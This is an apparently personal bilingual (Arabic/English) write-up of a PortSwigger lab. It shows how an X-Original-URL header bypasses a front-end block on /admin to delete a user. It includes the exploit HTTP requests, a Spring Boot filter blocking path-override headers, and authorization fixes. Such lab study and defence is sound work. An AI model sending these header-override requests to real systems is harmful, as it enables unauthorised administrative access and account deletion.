# 10 — URL-based access control can be circumvented

| | |
|---|---|
| **المصدر / Source** | [PortSwigger Lab](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented) |
| **المستوى / Level** | Practitioner |
| **تاريخ التوثيق / Documented** | 2026-11-04 (توثيق بأثر رجعي) |
| **الحالة / Status** | ✅ Solved |

---

## 🇸🇦 النسخة العربية

### ١. وصف الثغرة
طبقة أمامية (Front-end) تمنع الوصول الخارجي إلى `/admin` وتُرجع `403`. لكن التطبيق الخلفي (Back-end) يدعم هيدر `X-Original-URL` لتجاوز المسار. إرسال الطلب إلى `/` مع تعيين المسار الأصلي إلى `/admin` يتجاوز الحماية الأمامية.

- **النوع:** Vertical Privilege Escalation — Platform/URL-matching bypass.
- **الهدف:** الوصول للوحة الإدارة وحذف `carlos`.

### ٢. كيف استغلّيتها
1. تأكدت أن `/admin` محجوب من الطبقة الأمامية:
   ```http
   GET /admin HTTP/1.1
   ```
   → `403 Forbidden`.

2. أرسلت الطلب إلى مسار مسموح (`/`) مع هيدر يحدد المسار الحقيقي:
   ```http
   GET / HTTP/1.1
   Host: <lab-host>
   X-Original-URL: /admin
   ```
   → ظهرت لوحة الإدارة.

3. حذفت `carlos` عبر:
   ```http
   POST / HTTP/1.1
   Host: <lab-host>
   X-Original-URL: /admin/delete
   Content-Type: application/x-www-form-urlencoded

   username=carlos
   ```
   (بعض الإصدارات تقبل `GET /?username=carlos` مع نفس الهيدر.)

**النتيجة:** تجاوز قاعدة أمامية مبنية على المسار، والوصول إلى وظيفة إدارية.

### ٣. السبب الجذري (Root Cause)
- **اختلاف تفسير الطلب** بين الطبقة الأمامية والخلفية (Path Confusion).
- الطبقة الأمامية تفحص `request path` فقط، بينما الإطار الخلفي يعطي أولوية لـ`X-Original-URL`.
- لا يوجد تحقق صلاحية داخل التطبيق نفسه؛ الحماية موجودة في الشبكة فقط.
- الاعتماد على `URL` كآلية تحكم وصول بدل `Authorization` على الوظيفة.

### ٤. كيف أمنعها في Java Spring Boot
**١) امنع هيدرات إعادة كتابة المسار على الحافة وفي التطبيق:**

```java
@Component
public class PathOverrideHeaderFilter extends OncePerRequestFilter {

    private static final Set<String> FORBIDDEN =
        Set.of("X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix");

    @Override
    protected void doFilterInternal(HttpServletRequest req,
                                    HttpServletResponse res,
                                    FilterChain chain)
            throws ServletException, IOException {

        for (String h : FORBIDDEN) {
            if (req.getHeader(h) != null) {
                res.sendError(HttpServletResponse.SC_BAD_REQUEST, "Forbidden header");
                return;
            }
        }
        chain.doFilter(req, res);
    }
}
```

**٢) لا تعتمد على قواعد الشبكة وحدها. أضف تحققًا داخل التطبيق:**

```java
http.authorizeHttpRequests(auth -> auth
    .requestMatchers("/admin/**").hasRole("ADMIN")
    .anyRequest().authenticated());
```

**٣) وحّد تطبيع المسارات (Normalization) بين الـProxy والتطبيق، وارفض أي مسار غير متوقع بدل "تمريره كما هو".**

- **قاعدة مراجعة:** ابحث عن `X-Original-URL` و`X-Rewrite-URL` في الإعدادات والوثائق.
- **قاعدة تصميم:** الحماية يجب أن تكون في أعمق طبقة تملك القرار (التطبيق)، لا في طبقة لا تفهم الطلب كاملًا.

### ٥. درس مستفاد
عندما تختلف طبقتان في تفسير "ما هو المسار؟"، تنشأ ثغرة. أي هيدر يغيّر معنى الطلب يجب أن يُحذف عند الحافة أو يُرفض.

### ٦. أسئلة للتفكير
1. ما الفرق بين `X-Original-URL` و`X-Forwarded-For` من ناحية الثقة؟
2. كيف أختبر وجود Path Confusion في تطبيق Spring Boot؟
3. لو كانت الحماية في Nginx فقط، هل يكفي ذلك؟

---

## 🇬🇧 English Version

### 1. Vulnerability
A front-end layer blocks external access to `/admin`, but the back-end honors the `X-Original-URL` header. Sending a request to an allowed path while overriding the URL to `/admin` bypasses the front-end rule.

### 2. Exploitation
```http
GET / HTTP/1.1
X-Original-URL: /admin
```
Then:
```http
POST / HTTP/1.1
X-Original-URL: /admin/delete
Content-Type: application/x-www-form-urlencoded

username=carlos
```
This reaches the admin panel and deletes `carlos`.

### 3. Root Cause
- Path confusion: the front-end and back-end disagree on the effective URL.
- The front-end checks only the request path, while the framework prioritizes `X-Original-URL`.
- No application-level authorization; protection exists only at the network edge.

### 4. Prevention in Java Spring Boot
Reject path-override headers at the edge and in the application:

```java
if (req.getHeader("X-Original-URL") != null
        || req.getHeader("X-Rewrite-URL") != null) {
    res.sendError(HttpServletResponse.SC_BAD_REQUEST);
    return;
}
```
Also enforce authorization inside Spring Security (`/admin/**` → `hasRole("ADMIN")`) and normalize paths consistently across proxy and app.

### 5. Lesson Learned
When two layers disagree about the request path, access control breaks. Strip or reject any header that changes request semantics.

### 6. Reflection Questions
1. How does `X-Original-URL` trust differ from `X-Forwarded-For` trust?
2. How would you test for path confusion in a Spring Boot app?
3. Is edge-only protection sufficient? Why not?
